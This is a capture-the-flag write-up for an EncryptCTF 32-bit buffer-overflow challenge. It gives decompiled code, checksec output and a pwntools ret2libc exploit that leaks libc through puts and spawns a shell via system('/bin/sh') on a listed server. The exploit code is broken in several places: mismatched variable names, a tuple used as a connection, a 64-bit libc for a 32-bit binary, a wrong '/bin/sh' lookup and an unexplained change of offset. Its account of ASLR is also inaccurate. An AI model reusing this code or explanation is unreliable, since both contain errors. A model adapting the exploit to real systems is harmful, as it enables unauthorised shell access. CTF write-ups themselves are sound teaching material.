## PWN 1
### Category : Pwning/Binary Exploitaition

Not sure what the intended solution was, but I could solve the solution using a standard ret2libc exploit.

So as per usual, we are given a binary. After decompiling it in ghidra, we get the main function

```

undefined4 main(void)

{
  int iVar1;
  char local_30 [44];
  
  setvbuf(stdout,(char *)0x0,2,0);
  printf("$ ");
  gets(local_30);
  iVar1 = strcmp(local_30,"ls");
  if (iVar1 == 0) {
    run_command_ls();
  }
  else {
    printf("bash: command not found: %s\n",local_30);
  }
  puts("Bye!");
  return 0;
}
```

Since, gets is being used without any limit on the number of input char, this is a standard buffer overflow vuln

To successfully exploit a buffer overflow, we need a shell access, and unlike the previous challenge, we don't have a shell function to access.

Checksec output of the binary :
```
checksec pwn2
[*] '/home/vipul/Desktop/EncryptCTF/pwn2_SOLVED/pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
No Safety features!

To exploit the buffer overflow, we need the offset, using GDB and Pwntools, we get the offset at `44`

Now, since ASLR could be present, we need to first calculate the libc base address.

The theory of ASLR goes as in, since true randomization of complete memory space is in computaionally exhaustive, only randomization of the libc base is done, and hence, the difference in memory of locations of any two functions in libc remains constant


So, for the first part of the exploit, we need to calculate libc base. So we call the puts function (whose address is already present due to the main function calling it before) and pass the offset of puts as a argument to puts, and we parse the offset.

Let's say puts is at offset `0x400`, the libc base will be `<addr of function>-0x400`.

We parse the output of puts, and subtract it from address of puts to get the libc base.

Code for the above explanation

```
from pwn import *
context.binary = "./pwn2"
binary = ELF("./pwn2")
source = ("104.154.106.182", 3456)
ibc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
offset = 44
puts_plt = binary.symbols["plt.puts"]
log.info("puts@plt : {}".format(hex(puts_plt)))
put_got = binary.symbols["got.puts"]
log.info("puts@got : {}".format(hex(puts_got)))
main = binary.symbols["main"]
log.info("main : {}".format(hex(main)))

payload = ""
payload += 'A'*offset
payload += p32(puts_plt)
payload += p32(main)
payload += p32(puts_got)

source.sendline(payload)

source.recvuntil("Bye!\n")
leaked = u32(source.recv(4)) #the leaked address from GOT is printed here
libc_base = leaked - libc.symbols['puts']
```

Now after we know the offset of puts, we can calculate the location of `system`, by adding the offset to libc_base and we can also get the location of `/bin/sh`, which will be passed as a parameter to system, to get access to the shell

```
system = libc_base + libc.symbols['system']
binsh = libc_base + libc.symbols["/bin/sh"]

payload = ""
payload += "A"*(offset-8)
payload += p32(system)
payload += p32(0)
payload += p32(binsh)

source.sendline(payload)
p.interactive()
```

```
FLAG : encryptCTF{N!c3_j0b_jump3R}
```